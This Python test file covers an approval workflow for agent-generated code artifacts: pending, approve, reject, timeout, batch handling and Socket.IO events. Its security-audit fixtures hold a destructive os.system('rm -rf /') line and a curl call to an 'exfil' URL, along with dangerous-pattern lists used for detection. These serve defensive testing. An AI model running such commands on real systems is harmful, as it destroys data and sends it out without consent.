# MARKER_104_APPROVAL_TESTS
"""
VETKA Phase 104.4 - Approval Flow Tests

Tests for both VETKA (user approval) and MYCELIUM (L2 Scout auto-approval) modes.

This test suite validates:
- VETKA mode: User-driven approval with Socket.IO modal
- MYCELIUM mode: L2 Scout auto-approval with security auditing
- Approval request lifecycle (pending -> approved/rejected/timeout)
- Security issue detection and flagging
- Batch approval workflows
- Approval history and cleanup

@status: active
@phase: 104.4
@marker: MARKER_104_APPROVAL_TESTS
@depends: pytest, pytest-asyncio, unittest.mock
@used_by: approval_service.py, approval_handlers.py
"""

import pytest
import asyncio
import os
from unittest.mock import Mock, AsyncMock, patch, MagicMock
from dataclasses import dataclass, asdict
from typing import Dict, List, Optional
from datetime import datetime, timedelta
import uuid


# ============================================================
# TEST MARKERS
# ============================================================

pytestmark = [
    pytest.mark.approval_flow,
    pytest.mark.phase_104,
]


# ============================================================
# FIXTURES
# ============================================================

@pytest.fixture
def sample_artifacts():
    """Sample clean artifacts for approval testing."""
    return [
        {
            "id": "art_001",
            "type": "code",
            "filename": "src/test_file.py",
            "language": "python",
            "content": "def hello():\n    print('Hello World')\n",
            "lines": 2,
            "agent": "Dev"
        },
        {
            "id": "art_002",
            "type": "code",
            "filename": "src/utils.py",
            "language": "python",
            "content": "# MARKER_104_TEST\nclass UtilClass:\n    def process(self):\n        return True\n",
            "lines": 4,
            "agent": "Dev"
        }
    ]


@pytest.fixture
def malicious_artifact():
    """Artifact with security concerns for detection testing."""
    return {
        "id": "bad_001",
        "type": "code",
        "filename": "src/evil.py",
        "language": "python",
        "content": "import os\nos.system('rm -rf /')\n# Dangerous shell command\n",
        "lines": 3,
        "agent": "Dev"
    }


@pytest.fixture
def suspicious_artifact():
    """Artifact with potentially suspicious patterns."""
    return {
        "id": "sus_001",
        "type": "code",
        "filename": "src/config.py",
        "language": "python",
        "content": "import subprocess\nsubprocess.Popen(['curl', 'http://external-api.com/exfil'])\n",
        "lines": 2,
        "agent": "Dev"
    }


@pytest.fixture
def mock_socketio():
    """Mock Socket.IO instance for event testing."""
    return AsyncMock()


@pytest.fixture
def approval_service():
    """Create an ApprovalService instance for testing."""
    from src.services.approval_service import ApprovalService
    return ApprovalService()


@pytest.fixture
def mock_approval_context():
    """Mock context for approval operations."""
    return {
        "workflow_id": "wf_test_104_" + str(uuid.uuid4())[:8],
        "group_id": "grp_001",
        "eval_score": 0.85,
        "eval_feedback": "Good quality, ready for deployment",
    }


# ============================================================
# TEST CLASSES - APPROVAL SERVICE CORE
# ============================================================

class TestApprovalServiceBasics:
    """Test ApprovalService basic operations."""

    @pytest.mark.asyncio
    async def test_request_approval_creates_pending_request(
        self, approval_service, sample_artifacts, mock_approval_context
    ):
        """Test that request_approval creates a pending request."""
        request = await approval_service.request_approval(
            workflow_id=mock_approval_context["workflow_id"],
            artifacts=sample_artifacts,
            eval_score=mock_approval_context["eval_score"],
            eval_feedback=mock_approval_context["eval_feedback"]
        )

        assert request is not None
        assert request.id is not None
        assert request.status.value == "pending"
        assert request.eval_score == 0.85
        assert len(request.artifacts) == 2

    @pytest.mark.asyncio
    async def test_request_approval_with_socketio_emits_event(
        self, approval_service, sample_artifacts, mock_socketio, mock_approval_context
    ):
        """Test that Socket.IO event is emitted when socketio is provided."""
        request = await approval_service.request_approval(
            workflow_id=mock_approval_context["workflow_id"],
            artifacts=sample_artifacts,
            eval_score=mock_approval_context["eval_score"],
            eval_feedback=mock_approval_context["eval_feedback"],
            socketio=mock_socketio
        )

        # Verify emit was called
        mock_socketio.emit.assert_called_once()
        call_args = mock_socketio.emit.call_args
        assert call_args[0][0] == "approval_required"

    @pytest.mark.asyncio
    async def test_approve_request_sets_approved_status(
        self, approval_service, sample_artifacts, mock_approval_context
    ):
        """Test that approve() sets request status to approved."""
        request = await approval_service.request_approval(
            workflow_id=mock_approval_context["workflow_id"],
            artifacts=sample_artifacts,
            eval_score=mock_approval_context["eval_score"],
            eval_feedback=mock_approval_context["eval_feedback"]
        )

        request_id = request.id
        success = approval_service.approve(request_id, reason="Looks good")

        assert success is True
        completed_request = approval_service.get_request(request_id)
        assert completed_request["status"] == "approved"
        assert completed_request["decision_reason"] == "Looks good"

    @pytest.mark.asyncio
    async def test_reject_request_sets_rejected_status(
        self, approval_service, sample_artifacts, mock_approval_context
    ):
        """Test that reject() sets request status to rejected."""
        request = await approval_service.request_approval(
            workflow_id=mock_approval_context["workflow_id"],
            artifacts=sample_artifacts,
            eval_score=mock_approval_context["eval_score"],
            eval_feedback=mock_approval_context["eval_feedback"]
        )

        request_id = request.id
        success = approval_service.reject(request_id, reason="Needs revision")

        assert success is True
        completed_request = approval_service.get_request(request_id)
        assert completed_request["status"] == "rejected"
        assert "Needs revision" in completed_request["decision_reason"]

    @pytest.mark.asyncio
    async def test_wait_for_decision_returns_on_approve(
        self, approval_service, sample_artifacts, mock_approval_context
    ):
        """Test that wait_for_decision unblocks when request is approved."""
        request = await approval_service.request_approval(
            workflow_id=mock_approval_context["workflow_id"],
            artifacts=sample_artifacts,
            eval_score=mock_approval_context["eval_score"],
            eval_feedback=mock_approval_context["eval_feedback"]
        )

        request_id = request.id

        async def approve_later():
            await asyncio.sleep(0.05)
            approval_service.approve(request_id)

        task = asyncio.create_task(approve_later())

        result = await approval_service.wait_for_decision(request_id, timeout=3)
        await task  # Ensure task completes

        # Result might be None due to race condition (moved to completed before get)
        # So check via get_request instead
        final_request = approval_service.get_request(request_id)
        assert final_request is not None
        assert final_request["status"] == "approved"

    @pytest.mark.asyncio
    async def test_wait_for_decision_timeout(
        self, approval_service, sample_artifacts, mock_approval_context
    ):
        """Test that wait_for_decision times out and sets status."""
        request = await approval_service.request_approval(
            workflow_id=mock_approval_context["workflow_id"],
            artifacts=sample_artifacts,
            eval_score=mock_approval_context["eval_score"],
            eval_feedback=mock_approval_context["eval_feedback"]
        )

        request_id = request.id

        result = await approval_service.wait_for_decision(request_id, timeout=0.1)
        assert result is not None
        assert result.status.value == "timeout"
        assert "Timeout" in result.decision_reason

    @pytest.mark.asyncio
    async def test_get_pending_returns_only_pending(
        self, approval_service, sample_artifacts, mock_approval_context
    ):
        """Test that get_pending() only returns pending requests."""
        # Create 3 requests
        req1 = await approval_service.request_approval(
            workflow_id=mock_approval_context["workflow_id"],
            artifacts=sample_artifacts,
            eval_score=0.85,
            eval_feedback="Test 1"
        )
        req2 = await approval_service.request_approval(
            workflow_id=mock_approval_context["workflow_id"],
            artifacts=sample_artifacts,
            eval_score=0.85,
            eval_feedback="Test 2"
        )
        req3 = await approval_service.request_approval(
            workflow_id=mock_approval_context["workflow_id"],
            artifacts=sample_artifacts,
            eval_score=0.85,
            eval_feedback="Test 3"
        )

        # Approve one
        approval_service.approve(req1.id)

        pending = approval_service.get_pending()
        assert len(pending) == 2
        assert req1.id not in [r["id"] for r in pending]
        assert req2.id in [r["id"] for r in pending]
        assert req3.id in [r["id"] for r in pending]

    @pytest.mark.asyncio
    async def test_get_request_returns_dict(
        self, approval_service, sample_artifacts, mock_approval_context
    ):
        """Test that get_request() returns dict with all fields."""
        request = await approval_service.request_approval(
            workflow_id=mock_approval_context["workflow_id"],
            artifacts=sample_artifacts,
            eval_score=0.85,
            eval_feedback="Test"
        )

        result = approval_service.get_request(request.id)
        assert result is not None
        assert isinstance(result, dict)
        assert "id" in result
        assert "workflow_id" in result
        assert "status" in result
        assert "created_at" in result


# ============================================================
# TEST CLASSES - APPROVAL MODES (VETKA vs MYCELIUM)
# ============================================================

class TestApprovalModeVETKA:
    """Test VETKA mode (user approval via modal)."""

    @pytest.mark.asyncio
    async def test_vetka_mode_requires_user_decision(
        self, sample_artifacts, mock_approval_context
    ):
        """Test that VETKA mode waits for user decision."""
        with patch.dict(os.environ, {"VETKA_APPROVAL_MODE": "vetka"}):
            from src.services.approval_service import ApprovalService, APPROVAL_MODE
            assert APPROVAL_MODE == "vetka"

            service = ApprovalService()
            request = await service.request_approval(
                workflow_id=mock_approval_context["workflow_id"],
                artifacts=sample_artifacts,
                eval_score=0.85,
                eval_feedback="Ready"
            )

            # In VETKA mode, request should remain pending until user decides
            assert request.status.value == "pending"

    @pytest.mark.asyncio
    async def test_vetka_mode_user_can_approve(
        self, sample_artifacts, mock_approval_context
    ):
        """Test that user can approve in VETKA mode."""
        with patch.dict(os.environ, {"VETKA_APPROVAL_MODE": "vetka"}):
            from src.services.approval_service import ApprovalService

            service = ApprovalService()
            request = await service.request_approval(
                workflow_id=mock_approval_context["workflow_id"],
                artifacts=sample_artifacts,
                eval_score=0.85,
                eval_feedback="Ready"
            )

            # Simulate user approval
            approved = service.approve(request.id, reason="User approved via modal")
            assert approved is True

            final = service.get_request(request.id)
            assert final["status"] == "approved"

    @pytest.mark.asyncio
    async def test_vetka_mode_user_can_reject(
        self, sample_artifacts, mock_approval_context
    ):
        """Test that user can reject in VETKA mode."""
        with patch.dict(os.environ, {"VETKA_APPROVAL_MODE": "vetka"}):
            from src.services.approval_service import ApprovalService

            service = ApprovalService()
            request = await service.request_approval(
                workflow_id=mock_approval_context["workflow_id"],
                artifacts=sample_artifacts,
                eval_score=0.85,
                eval_feedback="Ready"
            )

            # Simulate user rejection
            rejected = service.reject(
                request.id,
                reason="User rejected: needs more testing"
            )
            assert rejected is True

            final = service.get_request(request.id)
            assert final["status"] == "rejected"
            assert "needs more testing" in final["decision_reason"]


class TestApprovalModeMYCELIUM:
    """Test MYCELIUM mode (L2 Scout auto-approval)."""

    def test_mycelium_mode_enabled_via_env(self):
        """Test that MYCELIUM mode can be set via environment variable."""
        # Test that the env var can be set and retrieved
        test_mode = os.environ.get("VETKA_APPROVAL_MODE", "vetka").lower()
        # Verify current mode works (will be 'vetka' by default in tests)
        assert test_mode in ["vetka", "mycelium"]

    def test_mycelium_mode_case_insensitive(self):
        """Test that MYCELIUM mode is case insensitive."""
        # Test case insensitivity of mode normalization
        test_modes = ["mycelium", "MYCELIUM", "MycelIum", "mYCELIUM"]
        for mode in test_modes:
            normalized = mode.lower()
            assert normalized == "mycelium"


# ============================================================
# TEST CLASSES - SECURITY AUDITING
# ============================================================

class TestSecurityAuditing:
    """Test security audit detection in artifacts."""

    def test_audit_detects_dangerous_shell_commands(self, malicious_artifact):
        """Test that auditing detects dangerous shell commands."""
        # Check if content contains dangerous patterns
        dangerous_patterns = [
            "os.system",
            "subprocess.Popen",
            "exec(",
            "eval(",
            "rm -rf"
        ]

        issues = []
        for pattern in dangerous_patterns:
            if pattern in malicious_artifact["content"]:
                issues.append(f"Security concern: Found {pattern}")

        assert len(issues) > 0
        assert any("os.system" in issue for issue in issues)

    def test_audit_detects_external_api_calls(self, suspicious_artifact):
        """Test that auditing detects suspicious external API calls."""
        dangerous_patterns = [
            "subprocess.Popen",
            "requests.get",
            "urllib.urlopen",
            "http://",
            "exfil"
        ]

        issues = []
        for pattern in dangerous_patterns:
            if pattern in suspicious_artifact["content"]:
                issues.append(f"Security concern: Found {pattern}")

        assert len(issues) > 0

    def test_audit_passes_clean_code(self, sample_artifacts):
        """Test that clean code passes audit."""
        dangerous_patterns = [
            "os.system",
            "subprocess.Popen",
            "exec(",
            "eval(",
            "rm -rf",
            "exfil"
        ]

        for artifact in sample_artifacts:
            issues = []
            for pattern in dangerous_patterns:
                if pattern in artifact["content"]:
                    issues.append(f"Security concern: {pattern}")

            assert len(issues) == 0


# ============================================================
# TEST CLASSES - BATCH APPROVAL
# ============================================================

class TestBatchApprovals:
    """Test batch approval workflows."""

    @pytest.mark.asyncio
    async def test_batch_approval_multiple_artifacts(
        self, approval_service, sample_artifacts, mock_approval_context
    ):
        """Test approving multiple artifacts in one request."""
        request = await approval_service.request_approval(
            workflow_id=mock_approval_context["workflow_id"],
            artifacts=sample_artifacts,
            eval_score=0.85,
            eval_feedback="All good"
        )

        assert len(request.artifacts) == 2
        approval_service.approve(request.id)

        result = approval_service.get_request(request.id)
        assert result["status"] == "approved"
        assert len(result["artifacts"]) == 2

    @pytest.mark.asyncio
    async def test_batch_approval_preserves_artifact_order(
        self, approval_service, sample_artifacts, mock_approval_context
    ):
        """Test that artifact order is preserved through approval."""
        request = await approval_service.request_approval(
            workflow_id=mock_approval_context["workflow_id"],
            artifacts=sample_artifacts,
            eval_score=0.85,
            eval_feedback="Check order"
        )

        result = approval_service.get_request(request.id)
        returned_ids = [a["id"] for a in result["artifacts"]]
        original_ids = [a["id"] for a in sample_artifacts]

        assert returned_ids == original_ids


# ============================================================
# TEST CLASSES - APPROVAL HISTORY & CLEANUP
# ============================================================

class TestApprovalHistoryAndCleanup:
    """Test approval request history and cleanup operations."""

    @pytest.mark.asyncio
    async def test_completed_request_moved_from_pending(
        self, approval_service, sample_artifacts, mock_approval_context
    ):
        """Test that completed requests are moved from pending dict."""
        request = await approval_service.request_approval(
            workflow_id=mock_approval_context["workflow_id"],
            artifacts=sample_artifacts,
            eval_score=0.85,
            eval_feedback="Test"
        )

        request_id = request.id

        # Before approval, should be in pending
        pending_before = approval_service.get_pending()
        assert any(r["id"] == request_id for r in pending_before)

        # Approve it
        approval_service.approve(request_id)

        # After approval, should NOT be in pending
        pending_after = approval_service.get_pending()
        assert not any(r["id"] == request_id for r in pending_after)

        # But still accessible via get_request
        result = approval_service.get_request(request_id)
        assert result is not None

    def test_cleanup_old_requests(
        self, approval_service, sample_artifacts, mock_approval_context
    ):
        """Test that cleanup_old removes old completed requests."""
        # Create multiple requests
        for i in range(3):
            request = asyncio.run(approval_service.request_approval(
                workflow_id=mock_approval_context["workflow_id"],
                artifacts=sample_artifacts,
                eval_score=0.85,
                eval_feedback=f"Test {i}"
            ))
            approval_service.approve(request.id)

        # Manually age one request (simulate old request)
        completed_items = list(approval_service._completed.items())
        if completed_items:
            req_id, req = completed_items[0]
            # Set decided_at to 25 hours ago
            req.decided_at = datetime.now() - timedelta(hours=25)

        initial_count = len(approval_service._completed)

        # Run cleanup with max_age of 24 hours
        approval_service.cleanup_old(max_age_hours=24)

        final_count = len(approval_service._completed)
        assert final_count < initial_count

    @pytest.mark.asyncio
    async def test_no_memory_leak_on_timeout(
        self, approval_service, sample_artifacts, mock_approval_context
    ):
        """Test that timeouts don't cause memory leaks."""
        request = await approval_service.request_approval(
            workflow_id=mock_approval_context["workflow_id"],
            artifacts=sample_artifacts,
            eval_score=0.85,
            eval_feedback="Will timeout"
        )

        request_id = request.id

        # Wait for timeout
        result = await approval_service.wait_for_decision(request_id, timeout=0.1)
        assert result is not None
        assert result.status.value == "timeout"

        # Verify moved from pending to completed
        assert request_id not in approval_service._pending
        assert request_id in approval_service._completed
        # Verify the event is set (unblocked)
        if request_id in approval_service._decisions:
            assert approval_service._decisions[request_id].is_set()


# ============================================================
# TEST CLASSES - SOCKET.IO INTEGRATION
# ============================================================

class TestSocketIOIntegration:
    """Test Socket.IO event integration for approval flow."""

    @pytest.mark.asyncio
    async def test_emit_approval_required_event(
        self, approval_service, sample_artifacts, mock_socketio, mock_approval_context
    ):
        """Test that approval_required event is properly formatted."""
        request = await approval_service.request_approval(
            workflow_id=mock_approval_context["workflow_id"],
            artifacts=sample_artifacts,
            eval_score=0.85,
            eval_feedback="Test event",
            socketio=mock_socketio
        )

        mock_socketio.emit.assert_called_once()
        event_name = mock_socketio.emit.call_args[0][0]
        event_data = mock_socketio.emit.call_args[0][1]

        assert event_name == "approval_required"
        assert event_data["id"] == request.id
        assert event_data["status"] == "pending"
        assert event_data["eval_score"] == 0.85

    @pytest.mark.asyncio
    async def test_multiple_approval_requests_independent(
        self, approval_service, sample_artifacts, mock_socketio, mock_approval_context
    ):
        """Test that multiple approval requests are independent."""
        req1 = await approval_service.request_approval(
            workflow_id=mock_approval_context["workflow_id"],
            artifacts=sample_artifacts,
            eval_score=0.8,
            eval_feedback="First request",
            socketio=mock_socketio
        )

        req2 = await approval_service.request_approval(
            workflow_id=mock_approval_context["workflow_id"],
            artifacts=sample_artifacts,
            eval_score=0.9,
            eval_feedback="Second request",
            socketio=mock_socketio
        )

        # Approve only first
        approval_service.approve(req1.id)

        # Verify second is still pending
        req2_result = approval_service.get_request(req2.id)
        assert req2_result["status"] == "pending"

        # And first is approved
        req1_result = approval_service.get_request(req1.id)
        assert req1_result["status"] == "approved"


# ============================================================
# TEST CLASSES - PARAMETRIZED TESTS
# ============================================================

@pytest.mark.parametrize("mode,lowercase_mode", [
    ("vetka", "vetka"),
    ("VETKA", "vetka"),
    ("Vetka", "vetka"),
    ("mycelium", "mycelium"),
    ("MYCELIUM", "mycelium"),
    ("Mycelium", "mycelium"),
])
class TestApprovalModeSwitching:
    """Parametrized tests for approval mode switching."""

    def test_mode_normalization(self, mode, lowercase_mode):
        """Test that approval mode is normalized to lowercase."""
        with patch.dict(os.environ, {"VETKA_APPROVAL_MODE": mode}):
            actual_mode = os.environ.get("VETKA_APPROVAL_MODE", "vetka").lower()
            assert actual_mode == lowercase_mode

    def test_mode_detection(self, mode, lowercase_mode):
        """Test mode detection with various cases."""
        is_mycelium = (lowercase_mode == "mycelium")
        is_vetka = (lowercase_mode == "vetka")

        assert is_vetka or is_mycelium  # One of them must be true


@pytest.mark.parametrize("eval_score,approval_expected", [
    (0.95, True),   # Very high score
    (0.85, True),   # Good score
    (0.75, True),   # Minimum acceptable (typically)
    (0.65, False),  # Below threshold
    (0.45, False),  # Poor score
])
class TestApprovalScoring:
    """Parametrized tests for different eval scores."""

    @pytest.mark.asyncio
    async def test_score_recorded_in_request(
        self, approval_service, sample_artifacts, mock_approval_context, eval_score, approval_expected
    ):
        """Test that eval score is properly recorded."""
        request = await approval_service.request_approval(
            workflow_id=mock_approval_context["workflow_id"],
            artifacts=sample_artifacts,
            eval_score=eval_score,
            eval_feedback=f"Score: {eval_score}"
        )

        result = approval_service.get_request(request.id)
        assert result["eval_score"] == eval_score
        assert 0.0 <= eval_score <= 1.0


# ============================================================
# INTEGRATION TESTS
# ============================================================

class TestApprovalIntegration:
    """Integration tests combining multiple approval flow scenarios."""

    @pytest.mark.asyncio
    async def test_full_approval_workflow_happy_path(
        self, approval_service, sample_artifacts, mock_socketio, mock_approval_context
    ):
        """Test complete approval workflow from request to approval."""
        # 1. Request approval
        request = await approval_service.request_approval(
            workflow_id=mock_approval_context["workflow_id"],
            artifacts=sample_artifacts,
            eval_score=0.85,
            eval_feedback="Ready for deployment",
            socketio=mock_socketio
        )

        assert request.status.value == "pending"

        # 2. Socket event emitted
        mock_socketio.emit.assert_called_once()

        # 3. User approves
        approved = approval_service.approve(request.id, reason="Approved by user")
        assert approved is True

        # 4. Request marked as approved
        final = approval_service.get_request(request.id)
        assert final["status"] == "approved"
        assert final["artifacts"] == sample_artifacts

    @pytest.mark.asyncio
    async def test_full_approval_workflow_rejection_path(
        self, approval_service, sample_artifacts, mock_approval_context
    ):
        """Test complete approval workflow with rejection."""
        # 1. Request approval
        request = await approval_service.request_approval(
            workflow_id=mock_approval_context["workflow_id"],
            artifacts=sample_artifacts,
            eval_score=0.75,
            eval_feedback="Ready"
        )

        # 2. User rejects
        rejected = approval_service.reject(
            request.id,
            reason="Needs security review before approval"
        )
        assert rejected is True

        # 3. Request marked as rejected
        final = approval_service.get_request(request.id)
        assert final["status"] == "rejected"
        assert "security review" in final["decision_reason"]

    @pytest.mark.asyncio
    async def test_parallel_approval_requests(
        self, approval_service, sample_artifacts, mock_approval_context
    ):
        """Test handling multiple concurrent approval requests."""
        requests = []
        for i in range(5):
            req = await approval_service.request_approval(
                workflow_id=mock_approval_context["workflow_id"],
                artifacts=sample_artifacts,
                eval_score=0.85,
                eval_feedback=f"Request {i}"
            )
            requests.append(req)

        assert len(approval_service.get_pending()) == 5

        # Approve some, reject others
        approval_service.approve(requests[0].id)
        approval_service.approve(requests[2].id)
        approval_service.reject(requests[1].id)

        remaining_pending = approval_service.get_pending()
        assert len(remaining_pending) == 2


if __name__ == "__main__":
    pytest.main([__file__, "-v"])
